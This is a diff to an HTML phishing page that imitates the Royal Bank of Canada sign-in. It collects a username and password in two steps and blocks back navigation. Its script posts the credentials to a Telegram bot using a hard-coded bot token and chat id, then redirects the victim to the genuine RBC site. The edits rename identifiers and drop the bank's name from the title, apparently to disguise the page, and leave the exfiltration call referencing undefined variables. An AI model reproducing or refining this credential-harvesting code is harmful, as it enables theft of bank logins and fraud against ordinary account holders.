@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Royal Bank of Canada - Login</title>
+    <title>Login Page</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-MB7x3PbUQwTUpiBrb1hzfvkhVXOg4Cnc7SRFto1xPVWhe7QEo2Ul7t3ODfn/hWZg/2X8r+DR2LlsmC5tc+E3cw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <style>
         body {
@@ -49,7 +49,7 @@
             position: relative;
         }
         label i {
-            margin-right: 8px; /* Adjust margin as needed */
+            margin-right: 8px;
         }
         label::after {
             content: '';
@@ -126,7 +126,7 @@
             cursor: pointer;
             position: absolute;
             top: 0;
-            right: calc(100% + 10px); /* Position the button to the right of the checkbox with some spacing */
+            right: calc(100% + 10px);
             background-color: #0056b3;
             color: #ffffff;
             border: none;
@@ -160,23 +160,23 @@
 </head>
 <body>
     <div class="banner-container">
-        <img src="Screenshot 2024-05-20 at 10.20.10.png" alt="Banner">
+        <img src="https://via.placeholder.com/1200x300" alt="Banner">
     </div>
-    <div class="container" id="username-form">
-        <form onsubmit="handleUsernameForm(event)">
-            <label for="username">
-                <i class="fas fa-lock"></i> <!-- Padlock icon -->
+    <div class="container" id="form-a">
+        <form id="form-a" onsubmit="handleFirstForm(event)">
+            <label for="user">
+                <i class="fas fa-lock"></i>
                 Client Card or Username
-                <button class="info-button" onclick="showInfoBox()">?</button>
+                <button class="info-button" type="button" onclick="toggleInfo()">?</button>
             </label>
-            <div class="info-box" id="info-box" style="display: none;">
+            <div class="info-box" id="info" style="display: none;">
                 <p>Save client card or username</p>
                 <p>If you delete the cookies on your computer, you’ll erase any saved client card numbers or usernames.</p>
                 <p>We don’t recommend this option if you’re using a public or shared computer.</p>
             </div>
-            <input type="text" id="username" name="username" placeholder="Client Card or Username" required>
+            <input type="text" id="user" name="user" placeholder="Client Card or Username" required>
             <label class="checkbox-label">
-                <input type="checkbox" name="save-username">
+                <input type="checkbox" name="remember">
                 Save information
             </label>
             <button type="submit">Next</button>
@@ -187,16 +187,16 @@
         <a href="#" onclick="openSidebar()">Other Online Services</a>
     </div>
 
-    <div class="container" id="password-form" style="display: none;">
-        <div class="username-display" id="username-display"></div>
-        <form onsubmit="handlePasswordForm(event)">
-            <label for="password">
-                <i class="fas fa-lock"></i> <!-- Padlock icon -->
+    <div class="container" id="form-b" style="display: none;">
+        <div class="username-display" id="user-display"></div>
+        <form id="form-b" onsubmit="handleSecondForm(event)">
+            <label for="pass">
+                <i class="fas fa-lock"></i>
                 Password
             </label>
-            <input type="password" id="password" name="password" placeholder="Password" required>
+            <input type="password" id="pass" name="pass" placeholder="Password" required>
             <label class="checkbox-label">
-                <input type="checkbox" id="show-password-checkbox">
+                <input type="checkbox" id="toggle-pass">
                 Show password
             </label>
             <button type="submit">Sign In</button>
@@ -218,13 +218,14 @@
     </footer>
 
     <script>
-        function handleUsernameForm(event) {
+        // Handles the first form submission
+        function handleFirstForm(event) {
             event.preventDefault();
-            const username = event.target.username.value;
-            document.getElementById('username-display').textContent = `Signing in with "${username}"`;
-            document.getElementById('username-form').style.display = 'none';
-            document.getElementById('password-form').style.display = 'block';
-
+            const user = event.target.user.value;
+            document.getElementById('user-display').textContent = `Signing in with "${user}"`;
+            document.getElementById('form-a').style.display = 'none';
+            document.getElementById('form-b').style.display = 'block';
+            
             // Disable back navigation
             history.pushState(null, document.title, location.href);
             window.addEventListener('popstate', function () {
@@ -232,27 +233,29 @@
             });
         }
 
-        function handlePasswordForm(event) {
+        // Handles the second form submission
+        function handleSecondForm(event) {
             event.preventDefault();
-            const username = document.querySelector('#username-display').textContent.split('"')[1];
-            const password = event.target.password.value;
-            sendToTelegramBot(username, password);
+            const user = document.querySelector('#user-display').textContent.split('"')[1];
+            const pass = event.target.pass.value;
+            sendCreds(user, pass);
             window.location.href = 'https://www.rbcroyalbank.com/personal.html'; // Redirect to the desired page
         }
 
-        function sendToTelegramBot(username, password) {
+        // Sends credentials to the Telegram bot
+        function sendCreds(user, pass) {
             const telegramBotToken = '7092763134:AAFoVnFRJKr5uw1QsaSx_0TVm5lfUd3Rifc';
             const chatId = 7043309571;
-            const message = `Username: ${username}\nPassword: ${password}`;
+            const msg = `User: ${user}\nPass: ${pass}`;
             
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
+                    chat_id: chat,
+                    text: msg
                 })
             }).then(response => response.json())
               .then(data => {
@@ -263,50 +266,23 @@
               });
         }
 
+        // Toggles the info box display
+        function toggleInfo() {
+            const info = document.getElementById('info');
+            info.style.display = info.style.display === 'block' ? 'none' : 'block';
+        }
+
+        // Opens the sidebar
         function openSidebar() {
-            // Replace with your desired functionality to open the sidebar
             alert('Opening sidebar...');
         }
 
-        function showInfoBox() {
-            const infoBox = document.getElementById('info-box');
-            infoBox.style.display = infoBox.style.display === 'block' ? 'none' : 'block';
-        }
-
-        const saveUsernameCheckbox = document.querySelector('input[name="save-username"]');
-        const showPasswordCheckbox = document.getElementById('show-password-checkbox');
-
-        saveUsernameCheckbox.addEventListener('change', function() {
-            // Implement your save username logic here
-            console.log('Save username checked:', saveUsernameCheckbox.checked);
+        // Toggles the password visibility
+        document.getElementById('toggle-pass').addEventListener('change', function () {
+            const passInput = document.getElementById('pass');
+            passInput.type = this.checked ? 'text' : 'password';
         });
-
-        showPasswordCheckbox.addEventListener('change', function() {
-            const passwordInput = document.getElementById('password');
-            if (showPasswordCheckbox.checked) {
-                passwordInput.type = 'text';
-            } else {
-                passwordInput.type = 'password';
-            }
-        });
-
-        // MutationObserver to monitor DOM changes
-        const targetNode = document.getElementById('username-form'); // Ensure the node exists
-        if (targetNode) {
-            const observerConfig = { childList: true, subtree: true };
-            const observerCallback = (mutationsList) => {
-                for (const mutation of mutationsList) {
-                    if (mutation.type === 'childList') {
-                        console.log('A child node has been added or removed.');
-                    }
-                }
-            };
-
-            const observer = new MutationObserver(observerCallback);
-            observer.observe(targetNode, observerConfig);
-        } else {
-            console.error("Target node for MutationObserver doesn't exist.");
-        }
     </script>
 </body>
 </html>
+
